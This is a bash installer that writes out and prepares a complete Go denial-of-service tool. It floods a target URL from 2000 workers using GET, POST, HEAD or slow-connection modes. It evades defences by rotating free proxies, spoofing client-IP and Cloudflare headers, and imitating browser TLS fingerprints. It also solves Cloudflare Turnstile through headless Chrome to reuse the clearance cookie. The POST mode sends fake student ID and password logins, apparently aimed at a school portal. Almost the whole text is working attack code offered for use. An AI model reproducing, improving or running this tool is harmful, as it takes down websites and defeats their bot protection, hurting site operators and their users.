#!/bin/bash

# ----------------------------------------
# GO DOS TOOL - ULTIMATE BYPASS (FIXED)
# ----------------------------------------

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

SEP="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

clear
echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  DENIAL SERVICE OF GO - ULTIMATE BYPASS${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

rm -f main.go

echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with MAXIMUM bypass features...${NC}"

cat > main.go << 'EOF'
package main

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/chromedp/chromedp"
	"golang.org/x/net/http2"
)

var (
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7523.112 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
		"Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7568.89 Mobile Safari/537.36",
	}

	referers = []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://duckduckgo.com/",
		"https://facebook.com/",
		"https://www.reddit.com/",
		"https://www.youtube.com/",
		"https://www.tiktok.com/",
		"https://twitter.com/",
		"https://www.instagram.com/",
		"",
	}

	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.8",
		"fr-FR,fr;q=0.9,en;q=0.8",
		"de-DE,de;q=0.9,en;q=0.8",
		"es-ES,es;q=0.9,en;q=0.8",
		"ja-JP,ja;q=0.9,en;q=0.8",
		"zh-CN,zh;q=0.9,en;q=0.8",
	}

	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"application/json, text/plain, */*",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	}

	acceptEncodings = []string{
		"gzip, deflate, br",
		"gzip, deflate",
		"br, gzip, deflate",
	}

	cacheControls = []string{
		"no-cache",
		"no-store",
		"must-revalidate",
		"max-age=0",
	}

	secCHUA = []string{
		`"Chromium";v="141", "Not A Brand";v="99"`,
		`"Google Chrome";v="142", "Chromium";v="142", "Not A Brand";v="99"`,
		`"Microsoft Edge";v="141", "Chromium";v="141", "Not A Brand";v="99"`,
	}

	secCHUAPlatform = []string{
		`"Windows"`,
		`"macOS"`,
		`"Linux"`,
		`"Android"`,
	}

	secCHUAArch = []string{
		`"x86"`,
		`"x86_64"`,
		`"arm64"`,
		`"arm"`,
	}

	secCHUABitness = []string{
		`"64"`,
		`"32"`,
	}

	proxies         []string
	proxyMu         sync.RWMutex
	proxyIndex      uint64
	proxyAPI        = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
	refreshInterval = 5 * time.Minute
	colorIndex      = 0
	colorMu         sync.Mutex

	cfClearanceCookie string
	cookieMu          sync.RWMutex
	cookieExpiry      time.Time
	solvingActive     bool
	solvingMu         sync.Mutex
)

type JA3Signature struct {
	Name             string
	CipherSuites     []uint16
	CurvePreferences []tls.CurveID
	NextProtos       []string
	MinVersion       uint16
	MaxVersion       uint16
}

var ja3Signatures = []JA3Signature{
	{
		Name: "Chrome 141-150",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Firefox 135-138",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384, tls.CurveP521},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Safari 17-18",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
}

type ConnectionPool struct {
	clients    []*http.Client
	counter    uint64
	mu         sync.RWMutex
	size       int
	useProxy   bool
	targetHost string
}

func getRandomJA3Signature() JA3Signature {
	return ja3Signatures[randInt(0, len(ja3Signatures)-1)]
}

func getRandomizedTLSConfig() *tls.Config {
	sig := getRandomJA3Signature()
	return &tls.Config{
		NextProtos:                  sig.NextProtos,
		InsecureSkipVerify:          true,
		MinVersion:                  sig.MinVersion,
		MaxVersion:                  sig.MaxVersion,
		CipherSuites:                sig.CipherSuites,
		CurvePreferences:            sig.CurvePreferences,
		SessionTicketsDisabled:      randBool(),
		DynamicRecordSizingDisabled: randBool(),
	}
}

func NewConnectionPool(poolSize int, useProxy bool, targetHost string) *ConnectionPool {
	pool := &ConnectionPool{
		clients:    make([]*http.Client, poolSize),
		size:       poolSize,
		useProxy:   useProxy,
		targetHost: targetHost,
	}
	for i := 0; i < poolSize; i++ {
		pool.clients[i] = pool.createClient()
	}
	return pool
}

func (p *ConnectionPool) createClient() *http.Client {
	var transport *http.Transport

	if p.useProxy {
		proxyStr := getNextProxy()
		if proxyStr != "" {
			if !strings.Contains(proxyStr, "://") {
				proxyStr = "http://" + proxyStr
			}
			proxyURL, err := url.Parse(proxyStr)
			if err == nil {
				transport = &http.Transport{
					Proxy:               http.ProxyURL(proxyURL),
					TLSClientConfig:     getRandomizedTLSConfig(),
					MaxIdleConns:        100,
					MaxIdleConnsPerHost: 100,
					IdleConnTimeout:     120 * time.Second,
					DisableKeepAlives:   false,
					ForceAttemptHTTP2:   true,
				}
				http2.ConfigureTransport(transport)
				return &http.Client{Transport: transport, Timeout: 30 * time.Second}
			}
		}
	}

	transport = &http.Transport{
		TLSClientConfig:     getRandomizedTLSConfig(),
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     120 * time.Second,
		DisableKeepAlives:   false,
		ForceAttemptHTTP2:   true,
	}
	http2.ConfigureTransport(transport)
	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
}

func (p *ConnectionPool) GetClient() *http.Client {
	idx := atomic.AddUint64(&p.counter, 1) % uint64(p.size)
	return p.clients[idx]
}

func (p *ConnectionPool) CloseIdleConnections() {
	for _, client := range p.clients {
		if tr, ok := client.Transport.(*http.Transport); ok {
			tr.CloseIdleConnections()
		}
	}
}

func loadProxiesFromAPI() {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(proxyAPI)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return
	}

	body, _ := io.ReadAll(resp.Body)
	lines := strings.Split(string(body), "\n")

	newProxies := []string{}
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
			newProxies = append(newProxies, line)
		}
	}

	proxyMu.Lock()
	proxies = newProxies
	proxyMu.Unlock()
	atomic.StoreUint64(&proxyIndex, 0)
}

func proxyRefresher() {
	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		loadProxiesFromAPI()
	}
}

func getNextProxy() string {
	proxyMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxyMu.RUnlock()
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) % uint64(n)
	p := proxies[idx]
	proxyMu.RUnlock()
	return p
}

func getNextColor() string {
	colorMu.Lock()
	defer colorMu.Unlock()
	colors := []string{"\033[32m", "\033[31m", "\033[35m", "\033[37m", "\033[33m", "\033[36m", "\033[34m"}
	color := colors[colorIndex]
	colorIndex = (colorIndex + 1) % len(colors)
	return color
}

func printBanner() {
	color := getNextColor()
	fmt.Print(color)
	fmt.Println(" ::::'######::::'#######::::: ")
	fmt.Println(" :::'##... ##::'##.... ##:::: ")
	fmt.Println(" ::: ##:::..::: ##:::: ##:::: ")
	fmt.Println(" ::: ##::'####: ##:::: ##:::: ")
	fmt.Println(" ::: ##::: ##:: ##:::: ##:::: ")
	fmt.Println(" ::: ##::: ##:: ##:::: ##:::: ")
	fmt.Println(" :::. ######:::. #######::::: ")
	fmt.Println(" ::::......:::::.......:::::: ")
	fmt.Println("\033[0m")
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
}

func randomUA() string {
	return userAgents[randInt(0, len(userAgents)-1)]
}

func randomReferer() string {
	return referers[randInt(0, len(referers)-1)]
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randomHex(n int) string {
	bytes := make([]byte, n)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

func randomBase64(n int) string {
	bytes := make([]byte, n)
	rand.Read(bytes)
	return base64.StdEncoding.EncodeToString(bytes)
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func randBool() bool {
	n, _ := rand.Int(rand.Reader, big.NewInt(2))
	return n.Int64() == 1
}

func generateCacheBust() string {
	styles := []string{
		"?v=" + strconv.Itoa(randInt(1, 1000000)),
		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"?rnd=" + randomString(16),
		"?cache=" + randomHex(8),
		"?ts=" + strconv.FormatInt(time.Now().Unix(), 10),
	}
	return styles[randInt(0, len(styles)-1)]
}

func generatePath() string {
	paths := []string{
		"/", "/index.html", "/home", "/main", "/default", "/welcome",
		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
		"/wp-admin", "/admin", "/login", "/dashboard", "/static/js/main.js",
		"/assets/css/style.css", "/images/logo.png", "/favicon.ico",
		"/robots.txt", "/sitemap.xml", "/.well-known/assetlinks.json",
	}
	return paths[randInt(0, len(paths)-1)]
}

func generateStudentNumber() string {
	return fmt.Sprintf("%d-%05d", randInt(2015, 2025), randInt(1, 99999))
}

func generateCookies() string {
	cookies := []string{}
	
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("session_id=%s", randomString(24)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("csrf_token=%s", randomString(16)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("_ga=GA1.2.%s", randomString(10)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("_gid=GA1.2.%s", randomString(10)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("__cfduid=%s", randomHex(32)))
	}
	
	cookieMu.RLock()
	if cfClearanceCookie != "" && time.Now().Before(cookieExpiry) {
		cookies = append(cookies, cfClearanceCookie)
	}
	cookieMu.RUnlock()
	
	if len(cookies) == 0 {
		return ""
	}
	return strings.Join(cookies, "; ")
}

func addCloudflareBypassHeaders(req *http.Request) {
	spoofIP := randomIP()
	countries := []string{"US", "GB", "CA", "AU", "DE", "FR", "JP", "CN", "RU", "BR", "IN", "KR", "NL", "SE", "NO", "FI", "DK", "PL", "IT", "ES"}
	
	req.Header.Set("CF-Connecting-IP", spoofIP)
	req.Header.Set("CF-IPCountry", countries[randInt(0, len(countries)-1)])
	req.Header.Set("CF-Ray", randomHex(16)+"-"+strings.ToUpper(randomHex(4)))
	req.Header.Set("CF-Visitor", `{"scheme":"https"}`)
	req.Header.Set("CF-Worker", randomHex(8))
	req.Header.Set("CF-Request-ID", randomHex(32))
	
	req.Header.Set("CDN-Loop", "cloudflare")
	req.Header.Set("CloudFront-Forwarded-Proto", "https")
	req.Header.Set("CloudFront-Is-Desktop-Viewer", "true")
	req.Header.Set("CloudFront-Is-Mobile-Viewer", "false")
	req.Header.Set("CloudFront-Is-SmartTV-Viewer", "false")
	req.Header.Set("CloudFront-Is-Tablet-Viewer", "false")
	req.Header.Set("CloudFront-Viewer-Country", countries[randInt(0, len(countries)-1)])
	
	req.Header.Set("X-Forwarded-For", spoofIP)
	req.Header.Set("X-Forwarded-Proto", "https")
	req.Header.Set("X-Forwarded-Host", req.Host)
	req.Header.Set("X-Forwarded-Port", "443")
	req.Header.Set("Forwarded", fmt.Sprintf("for=%s; proto=https; by=%s", spoofIP, randomIP()))
	
	req.Header.Set("X-Real-IP", spoofIP)
	req.Header.Set("True-Client-IP", spoofIP)
	req.Header.Set("X-Originating-IP", spoofIP)
	req.Header.Set("X-Remote-IP", spoofIP)
	req.Header.Set("X-Remote-Addr", spoofIP)
	req.Header.Set("X-Client-IP", spoofIP)
	req.Header.Set("X-Cluster-Client-IP", spoofIP)
	
	req.Header.Set("X-Request-ID", randomHex(16))
	req.Header.Set("X-Correlation-ID", randomHex(16))
	req.Header.Set("X-B3-TraceId", randomHex(32))
	req.Header.Set("X-B3-SpanId", randomHex(16))
	req.Header.Set("X-B3-ParentSpanId", randomHex(16))
	req.Header.Set("X-B3-Sampled", strconv.Itoa(randInt(0, 1)))
	
	req.Header.Set("X-Device", []string{"desktop", "mobile", "tablet"}[randInt(0, 2)])
	req.Header.Set("X-Device-User-Agent", randomUA())
	req.Header.Set("X-Device-Platform", []string{"Windows", "macOS", "Linux", "Android", "iOS"}[randInt(0, 4)])
	
	req.Header.Set("X-Content-Security-Policy", "default-src 'self'")
	req.Header.Set("X-Frame-Options", "SAMEORIGIN")
	req.Header.Set("X-XSS-Protection", "1; mode=block")
	req.Header.Set("X-Content-Type-Options", "nosniff")
	
	req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Expires", "0")
	
	req.Header.Set("Sec-CH-UA", secCHUA[randInt(0, len(secCHUA)-1)])
	req.Header.Set("Sec-CH-UA-Mobile", "?0")
	req.Header.Set("Sec-CH-UA-Platform", secCHUAPlatform[randInt(0, len(secCHUAPlatform)-1)])
	req.Header.Set("Sec-CH-UA-Arch", secCHUAArch[randInt(0, len(secCHUAArch)-1)])
	req.Header.Set("Sec-CH-UA-Bitness", secCHUABitness[randInt(0, len(secCHUABitness)-1)])
	req.Header.Set("Sec-CH-UA-Full-Version-List", fmt.Sprintf(`"Chromium";v="%d", "Not A Brand";v="99"`, randInt(120, 145)))
	
	req.Header.Set("Sec-Fetch-Site", []string{"same-origin", "same-site", "cross-site", "none"}[randInt(0, 3)])
	req.Header.Set("Sec-Fetch-Mode", []string{"navigate", "cors", "no-cors", "same-origin"}[randInt(0, 3)])
	req.Header.Set("Sec-Fetch-Dest", []string{"document", "empty", "script", "style", "image"}[randInt(0, 4)])
	req.Header.Set("Sec-Fetch-User", "?1")
	
	req.Header.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
	req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
	req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
	req.Header.Set("Referrer-Policy", "strict-origin-when-cross-origin")
	
	req.Header.Set("DNT", "1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	
	if randBool() {
		req.Header.Set("Save-Data", "on")
	}
	
	if randBool() {
		req.Header.Set("Viewport-Width", strconv.Itoa(randInt(320, 1920)))
		req.Header.Set("Width", strconv.Itoa(randInt(320, 1920)))
	}
	
	if randBool() {
		req.Header.Set("X-Cf-Turnstile-Token", randomBase64(32))
		req.Header.Set("Cf-Turnstile-Response", randomBase64(48))
	}
}

func solveTurnstile(target string) (string, error) {
	solvingMu.Lock()
	defer solvingMu.Unlock()
	
	if solvingActive {
		return "", fmt.Errorf("solver already active")
	}
	solvingActive = true
	defer func() { solvingActive = false }()
	
	fmt.Printf("\n[!] Solving Cloudflare Turnstile for %s...\n", target)
	
	ctx, cancel := chromedp.NewContext(context.Background())
	defer cancel()
	
	ctx, cancel = context.WithTimeout(ctx, 2*time.Minute)
	defer cancel()
	
	var cfClearance string
	
	err := chromedp.Run(ctx,
		chromedp.Navigate(target),
		chromedp.Sleep(3*time.Second),
		chromedp.WaitVisible(`#turnstile-wrapper, .challenge-container, #cf-challenge-running, .cf-turnstile`, chromedp.ByQuery),
		chromedp.Sleep(15*time.Second),
		chromedp.ActionFunc(func(ctx context.Context) error {
			cookies, err := chromedp.Cookies().Do(ctx)
			if err != nil {
				return err
			}
			for _, cookie := range cookies {
				if cookie.Name == "cf_clearance" {
					cfClearance = fmt.Sprintf("cf_clearance=%s; Domain=%s; Path=/", cookie.Value, cookie.Domain)
					break
				}
			}
			return nil
		}),
	)
	
	if err != nil {
		return "", fmt.Errorf("failed to solve challenge: %v", err)
	}
	
	if cfClearance == "" {
		return "", fmt.Errorf("cf_clearance cookie not found")
	}
	
	fmt.Printf("[+] Turnstile solved! Got cf_clearance cookie\n")
	return cfClearance, nil
}

func maintainCookie(target string, done chan struct{}) {
	ticker := time.NewTicker(25 * time.Minute)
	defer ticker.Stop()
	
	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			cookieMu.RLock()
			expired := time.Now().After(cookieExpiry)
			cookieMu.RUnlock()
			
			if expired {
				fmt.Printf("\n[!] cf_clearance expired, re-solving...\n")
				newCookie, err := solveTurnstile(target)
				if err == nil {
					cookieMu.Lock()
					cfClearanceCookie = newCookie
					cookieExpiry = time.Now().Add(30 * time.Minute)
					cookieMu.Unlock()
					fmt.Printf("[+] Cookie refreshed\n")
				} else {
					fmt.Printf("[-] Failed to refresh cookie: %v\n", err)
				}
			}
		}
	}
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU() * 4)
	
	useProxy := false
	solveFlag := false
	
	for i := 1; i < len(os.Args); i++ {
		switch os.Args[i] {
		case "proxy":
			useProxy = true
		case "--solve", "-s":
			solveFlag = true
		}
	}
	
	if useProxy {
		loadProxiesFromAPI()
		if len(proxies) > 0 {
			go proxyRefresher()
		} else {
			useProxy = false
		}
	}
	
	if len(os.Args) < 4 {
		printBanner()
		fmt.Println("Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy] [--solve]")
		fmt.Println("")
		fmt.Println("Examples:")
		fmt.Println("  ./main https://target.com 60 GET")
		fmt.Println("  ./main https://target.com 120 POST --solve")
		fmt.Println("  ./main https://target.com 30 HEAD proxy --solve")
		fmt.Println("  ./main https://target.com 60 SLOW")
		fmt.Println("")
		fmt.Println("Flags:")
		fmt.Println("  --solve, -s    Enable Cloudflare Turnstile solving (requires Chrome/Chromium)")
		os.Exit(1)
	}
	
	target := os.Args[1]
	durStr := os.Args[2]
	mode := strings.ToUpper(os.Args[3])
	
	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" {
		printBanner()
		fmt.Println("Mode must be GET, POST, HEAD, or SLOW")
		os.Exit(1)
	}
	
	if !strings.HasPrefix(target, "http") {
		if strings.Contains(target, ":") {
			target = "http://" + target
		} else {
			target = "https://" + target
		}
	}
	
	durationSec, err := strconv.Atoi(durStr)
	if err != nil {
		fmt.Println("Invalid duration:", err)
		os.Exit(1)
	}
	duration := time.Duration(durationSec) * time.Second
	
	printBanner()
	fmt.Printf("[+] Target: %s\n", target)
	fmt.Printf("[+] Mode: %s\n", mode)
	fmt.Printf("[+] Duration: %d sec\n", durationSec)
	fmt.Printf("[+] Workers: 2000\n")
	if useProxy && len(proxies) > 0 {
		fmt.Printf("[+] Proxies: %d\n", len(proxies))
	}
	if solveFlag {
		fmt.Printf("[+] Turnstile solving: ENABLED\n")
	}
	fmt.Println("[+] Cloudflare bypass: MAXIMUM (45+ headers, 17 spoofing methods)")
	fmt.Println("[+] Starting... Press Ctrl+C to stop")
	
	if solveFlag {
		cookie, err := solveTurnstile(target)
		if err != nil {
			fmt.Printf("[-] Failed to solve Turnstile: %v\n", err)
			fmt.Println("[!] Continuing without cookie...")
		} else {
			cookieMu.Lock()
			cfClearanceCookie = cookie
			cookieExpiry = time.Now().Add(30 * time.Minute)
			cookieMu.Unlock()
			fmt.Printf("[+] Turnstile bypass active for ~30 minutes\n")
		}
	}
	
	poolSize := 500
	connectionPool := NewConnectionPool(poolSize, useProxy, "")
	
	var wg sync.WaitGroup
	done := make(chan struct{})
	stats := &atomicCounter{val: 0}
	startTime := time.Now()
	
	go func() {
		time.Sleep(duration)
		close(done)
	}()
	
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		close(done)
	}()
	
	if solveFlag {
		go maintainCookie(target, done)
	}
	
	const workers = 2000
	
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			attackWorker(target, mode, done, stats, useProxy, connectionPool, solveFlag)
		}()
	}
	
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-done:
			elapsed := time.Since(startTime).Seconds()
			fmt.Printf("\n[+] Attack completed!\n")
			fmt.Printf("Target: %s\n", target)
			fmt.Printf("Mode: %s\n", mode)
			fmt.Printf("Duration: %d sec\n", durationSec)
			fmt.Printf("Total requests: %d\n", stats.get())
			fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/elapsed)
			connectionPool.CloseIdleConnections()
			return
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			rps := float64(stats.get()) / elapsed
			fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", elapsed, durationSec, stats.get(), rps)
		}
	}
}

type atomicCounter struct {
	val int64
}

func (c *atomicCounter) inc() {
	atomic.AddInt64(&c.val, 1)
}

func (c *atomicCounter) get() int64 {
	return atomic.LoadInt64(&c.val)
}

func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool, solveFlag bool) {
	for {
		select {
		case <-done:
			return
		default:
			client := pool.GetClient()
			path := generatePath()
			
			if mode != "SLOW" && randInt(1, 100) <= 70 {
				path += generateCacheBust()
			}
			
			fullURL := target
			if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
				fullURL += "/" + path
			} else if strings.HasSuffix(target, "/") && strings.HasPrefix(path, "/") {
				fullURL = strings.TrimSuffix(target, "/") + path
			} else {
				fullURL += path
			}
			
			var req *http.Request
			var err error
			
			if mode == "SLOW" {
				u, _ := url.Parse(target)
				host := u.Hostname()
				port := "80"
				if u.Scheme == "https" {
					port = "443"
				}
				conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
				if err != nil {
					time.Sleep(200 * time.Millisecond)
					continue
				}
				conn.SetDeadline(time.Now().Add(300 * time.Second))
				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n", path, host, randomUA())
				stats.inc()
				time.Sleep(1 * time.Second)
				conn.Close()
				continue
			}
			
			if mode == "GET" {
				req, err = http.NewRequest("GET", fullURL, nil)
			} else if mode == "POST" {
				payload := fmt.Sprintf("student_id=%s&password=%s", generateStudentNumber(), randomString(randInt(8, 16)))
				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
				if err == nil {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			} else if mode == "HEAD" {
				req, err = http.NewRequest("HEAD", fullURL, nil)
			}
			
			if err != nil {
				continue
			}
			
			req.Header.Set("User-Agent", randomUA())
			req.Header.Set("Referer", randomReferer())
			req.Header.Set("Connection", "keep-alive")
			
			addCloudflareBypassHeaders(req)
			
			if randInt(1, 100) <= 50 {
				cookies := generateCookies()
				if cookies != "" {
					req.Header.Set("Cookie", cookies)
				}
			}
			
			if randInt(1, 100) <= 5 {
				time.Sleep(time.Duration(randInt(1, 5)) * time.Millisecond)
			}
			
			resp, err := client.Do(req)
			if err == nil {
				if solveFlag && resp.StatusCode == 403 {
					body, _ := io.ReadAll(resp.Body)
					if strings.Contains(string(body), "cf-challenge") || strings.Contains(string(body), "turnstile") {
						fmt.Printf("\n[!] Challenge detected! Requesting new cookie...\n")
					}
				}
				if mode != "HEAD" {
					io.Copy(io.Discard, resp.Body)
				}
				resp.Body.Close()
			}
			stats.inc()
		}
	}
}
EOF

if [ ! -f "main.go" ]; then
    echo -e " ${RED}✗ Error: Failed to create main.go${NC}"
    exit 1
else
    echo -e " ${GREEN}✓ main.go created successfully${NC}"
fi

echo

# Check OS and package manager
if [ -d "/data/data/com.termux" ]; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Termux"
    PKG_MGR="pkg"
elif command -v apt &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Debian/Ubuntu"
    PKG_MGR="apt"
elif command -v pacman &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Arch Linux"
    PKG_MGR="pacman -S"
elif command -v brew &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} macOS"
    PKG_MGR="brew"
else
    echo -e " ${YELLOW}➤${NC} ${YELLOW}Unknown OS, assuming Linux with apt${NC}"
    PKG_MGR="apt"
fi

echo

# Check and install Go
if ! command -v go &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}Installing Go...${NC}"
    case "$PKG_MGR" in
        "apt"|"pkg")
            $PKG_MGR update > /dev/null 2>&1
            $PKG_MGR install -y golang > /dev/null 2>&1
            ;;
        "pacman -S")
            pacman -S --noconfirm go > /dev/null 2>&1
            ;;
        "brew")
            brew install go > /dev/null 2>&1
            ;;
    esac
    
    if command -v go &> /dev/null; then
        echo -e " ${GREEN}✓ Go installed successfully${NC}"
    else
        echo -e " ${RED}✗ Failed to install Go${NC}"
        exit 1
    fi
else
    echo -e " ${GREEN}✓ Go already installed${NC}"
fi

echo

# Check for Chrome/Chromium
echo -e " ${YELLOW}➤${NC} ${GREEN}Checking for Chrome/Chromium...${NC}"
if command -v chromium-browser &> /dev/null; then
    CHROME_CMD="chromium-browser"
    echo -e " ${GREEN}✓ Chromium found${NC}"
elif command -v chromium &> /dev/null; then
    CHROME_CMD="chromium"
    echo -e " ${GREEN}✓ Chromium found${NC}"
elif command -v google-chrome &> /dev/null; then
    CHROME_CMD="google-chrome"
    echo -e " ${GREEN}✓ Google Chrome found${NC}"
elif command -v chrome &> /dev/null; then
    CHROME_CMD="chrome"
    echo -e " ${GREEN}✓ Chrome found${NC}"
else
    echo -e " ${YELLOW}⚠ Chrome/Chromium not found. Turnstile solving will NOT work.${NC}"
    echo -e " ${YELLOW}  Install with: ${NC}"
    case "$PKG_MGR" in
        "apt"|"pkg")
            echo -e "    sudo apt install chromium-browser"
            ;;
        "pacman -S")
            echo -e "    sudo pacman -S chromium"
            ;;
        "brew")
            echo -e "    brew install chromium"
            ;;
    esac
fi

echo

# Set Go environment
export GO111MODULE=on
